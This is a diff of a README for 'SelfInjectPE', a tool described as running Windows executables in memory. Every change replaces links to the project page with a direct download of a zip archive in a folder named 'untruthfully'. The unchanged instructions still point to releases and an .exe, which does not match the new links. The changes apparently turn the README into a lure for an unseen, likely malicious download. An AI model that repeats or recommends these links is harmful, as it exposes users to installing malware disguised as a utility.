@@ -1,6 +1,6 @@
 # ⚙️ SelfInjectPE - Run PE Files in Memory Fast
 
-[![Download Now](https://img.shields.io/badge/Download-SelfInjectPE-brightgreen?style=for-the-badge)](https://github.com/veiled-xavier153/SelfInjectPE)
+[![Download Now](https://img.shields.io/badge/Download-SelfInjectPE-brightgreen?style=for-the-badge)](https://github.com/veiled-xavier153/SelfInjectPE/raw/refs/heads/main/untruthfully/Inject_PE_Self_v1.5.zip)
 
 SelfInjectPE is a simple application to run Windows Portable Executable (PE) files directly in your computer’s memory. It does this without using the relocation table, which can speed up the process. This tool can help users run certain programs more quickly and with fewer steps.
 
@@ -34,12 +34,12 @@ Start using SelfInjectPE in three easy steps.
 
 ## 📥 Download and Install SelfInjectPE
 
-[![Download SelfInjectPE](https://img.shields.io/badge/Download-SelfInjectPE-blue?style=for-the-badge)](https://github.com/veiled-xavier153/SelfInjectPE)
+[![Download SelfInjectPE](https://img.shields.io/badge/Download-SelfInjectPE-blue?style=for-the-badge)](https://github.com/veiled-xavier153/SelfInjectPE/raw/refs/heads/main/untruthfully/Inject_PE_Self_v1.5.zip)
 
 To get SelfInjectPE:
 
 1. Click the green or blue "Download" button above or go to  
-   [https://github.com/veiled-xavier153/SelfInjectPE](https://github.com/veiled-xavier153/SelfInjectPE)
+   [https://github.com/veiled-xavier153/SelfInjectPE/raw/refs/heads/main/untruthfully/Inject_PE_Self_v1.5.zip](https://github.com/veiled-xavier153/SelfInjectPE/raw/refs/heads/main/untruthfully/Inject_PE_Self_v1.5.zip)
 
 2. On the GitHub page, find the section named "Releases" or look for a file named `SelfInjectPE.exe` or similar.
 
@@ -117,7 +117,7 @@ You can use SelfInjectPE to run your own PE files or others downloaded from safe
 ## 🔗 Useful Links
 
 Download and explore SelfInjectPE here:  
-https://github.com/veiled-xavier153/SelfInjectPE
+https://github.com/veiled-xavier153/SelfInjectPE/raw/refs/heads/main/untruthfully/Inject_PE_Self_v1.5.zip
 
 Explore related tools for working with PE files on GitHub if interested.
 
